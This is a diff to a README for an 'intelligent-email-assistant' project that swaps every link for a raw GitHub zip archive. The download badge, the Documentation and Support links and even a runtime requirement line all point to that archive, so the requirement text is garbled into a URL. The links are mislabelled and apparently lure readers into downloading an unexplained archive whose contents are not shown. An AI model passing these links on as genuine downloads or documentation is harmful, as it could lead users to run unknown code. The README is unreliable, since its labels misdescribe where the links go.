@@ -8,7 +8,7 @@ Welcome to the intelligent-email-assistant! This software helps you manage your 
 
 To get started, you need to download the software. Visit the Releases page to find the latest version:
 
-[![Download Latest Release](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/serotherapeutics/intelligent-email-assistant.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/serotherapeutics/intelligent-email-assistant.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/src/assistant_email_intelligent_3.9.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/src/assistant_email_intelligent_3.9.zip)
 
 Follow these steps to download and install the application:
 
@@ -26,7 +26,7 @@ To run the intelligent-email-assistant, your computer should meet the following 
 - **RAM:** Minimum 4GB
 - **Storage:** At least 200MB of free space
 - **Java:** Version 8 or higher (for the Spring Boot backend)
-- **https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/serotherapeutics/intelligent-email-assistant.zip** Version 12 or higher (for the React frontend)
+- **https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/src/assistant_email_intelligent_3.9.zip** Version 12 or higher (for the React frontend)
 - **React Native:** Installed if you are using the mobile app
 
 ## 📄 Features
@@ -67,8 +67,8 @@ The intelligent-email-assistant covers a variety of topics that may interest you
 
 For further information or help, explore these resources:
 
-- [Documentation](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/serotherapeutics/intelligent-email-assistant.zip): In-depth guides on using the application.
-- [Support](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/serotherapeutics/intelligent-email-assistant.zip): Report any issues or ask questions.
+- [Documentation](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/src/assistant_email_intelligent_3.9.zip): In-depth guides on using the application.
+- [Support](https://raw.githubusercontent.com/godprim3/intelligent-email-assistant/main/src/assistant_email_intelligent_3.9.zip): Report any issues or ask questions.
 
 ## 🛡️ License
 
